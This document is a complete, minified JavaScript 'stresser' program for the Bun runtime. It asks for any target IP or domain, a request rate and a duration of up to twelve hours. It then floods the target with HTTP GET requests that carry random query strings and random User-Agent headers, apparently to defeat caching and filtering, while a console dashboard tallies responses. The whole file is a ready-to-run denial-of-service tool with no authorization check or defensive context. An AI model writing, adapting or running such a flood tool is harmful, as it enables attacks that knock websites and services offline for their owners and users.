import t from "dayjs";
import o from "dayjs/plugin/duration";
t.extend(o);
import e from "random-useragent";
import a from "kind-of";
import n from "readline";
import r from "./package.json";
let rl = n.createInterface({ input: process.stdin, output: process.stdout })
    , intervals = {}
    , print = () => { console.clear(), console.log("\n"), console.log("    \x1b[90m #####   ######   #####    #####    #####    #####", "\x1b[0m"), console.log("    \x1b[90m##         ##     ##  ##   ##      ##       ##", "\x1b[0m"), console.log("    \x1b[90m ####      ##     #####    ####     ####     ####", "\x1b[0m"), console.log("    \x1b[90m    ##     ##     ##  ##   ##          ##       ##", "\x1b[0m"), console.log("    \x1b[90m#####      ##     ##  ##   #####   #####    #####", "\x1b[0m"), console.log(""), console.log("                                                   \x1b[37mv" + r.version, "\x1b[0m"), console.log("") }
    , start = () => {
        print(), rl.question("Target (IP/Domain): ", o => {
            if (print(), "" === (o = o.toLowerCase()
                    .trim()
                    .split("https://")
                    .join("")
                    .split("http://")
                    .join("")
                    .split("/")[0])) { console.log("Field target cannot be left blank."), setTimeout(start, 2500); return }
            if ("string" !== a(o)) { console.log("Field target must be a string."), setTimeout(start, 2500); return } console.log("Target (IP/Domain): " + o), rl.question("PPT (Packets Per Transaction): ", a => {
                if (print(), "" === a) { console.log("Field ppt cannot be left blank."), setTimeout(start, 2500); return }
                if (isNaN(a)) { console.log("Field ppt must be a number."), setTimeout(start, 2500); return } a < 1 && (a = 1), a > 100 && (a = 100), console.log("Target (IP/Domain): " + o), console.log("PPT (Packets Per Transaction): " + a), rl.question("Duration (s): ", async n => {
                    if (print(), "" === n) { console.log("Field duration cannot be left blank."), setTimeout(start, 2500); return }
                    if (isNaN(n)) { console.log("Field duration must be a number."), setTimeout(start, 2500); return } n < 1 && (n = 1), n > 43200 && (n = 43200), console.log("Target (IP/Domain): " + o), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + n), console.log(""), console.log("Status                       \x1b[33mPreparing... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(1e3), print(), console.log("Target (IP/Domain): " + o), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + n), console.log(""), console.log("Status                       \x1b[33mAlmost Ready... ⟳", "\x1b[0m"), console.log("Packets Sent                 \x1b[90m--", "\x1b[0m"), console.log("Successful Resp.             \x1b[90m--", "\x1b[0m"), console.log("Unsuccessful Resp.           \x1b[90m--", "\x1b[0m"), console.log("Remaining Time               \x1b[90m--", "\x1b[0m"), console.log(""), await Bun.sleep(2500);
                    let r = !0
                        , s = 0
                        , $ = 0
                        , l = 0
                        , m = n;
                    intervals.STRESSING = setInterval(() => {
                        for (let t = 0; t < a; t++) s++, fetch("http://" + o + "?" + Math.random() + "=" + Math.random(), { method: "GET", headers: { "User-Agent": e.getRandom() } })
                            .then(t => { t.status >= 200 && t.status < 300 || t.status >= 400 && t.status < 500 ? $++ : l++ })
                            .catch(t => l++)
                    });
                    let i, g, _, b;
                    setInterval(() => {
                        print(), console.log("Target (IP/Domain): " + o), console.log("PPT (Packets Per Transaction): " + a), console.log("Duration (s): " + n), console.log(""), console.log("Status                       " + (r ? "\x1b[37mRunning ▶" : "\x1b[31mStopped ■"), "\x1b[0m"), console.log("Packets Sent                 " + (i !== s ? "\x1b[34m" : "\x1b[90m") + (void 0 !== s ? s + " ↑" : "--"), "\x1b[0m"), console.log("Successful Resp.             " + (g !== $ ? "\x1b[32m" : "\x1b[90m") + (void 0 !== $ ? $ + " ↓" : "--"), "\x1b[0m"), console.log("Unsuccessful Resp.           " + (_ !== l ? "\x1b[31m" : "\x1b[90m") + (void 0 !== l ? l + " ⇣" : "--"), "\x1b[0m"), console.log("Remaining Time               " + (b !== m ? "\x1b[33m" : "\x1b[90m") + (void 0 !== m ? t.duration(m, "seconds")
                            .format("HH:mm:ss") + " ⏱︎" : "--"), "\x1b[0m"), console.log(""), i = s, g = $, _ = l, b = m
                    }, 1e3), setInterval(() => { 0 === m ? (r = !1, clearInterval(intervals.STRESSING)) : m-- }, 1e3)
                })
            })
        })
    };
start();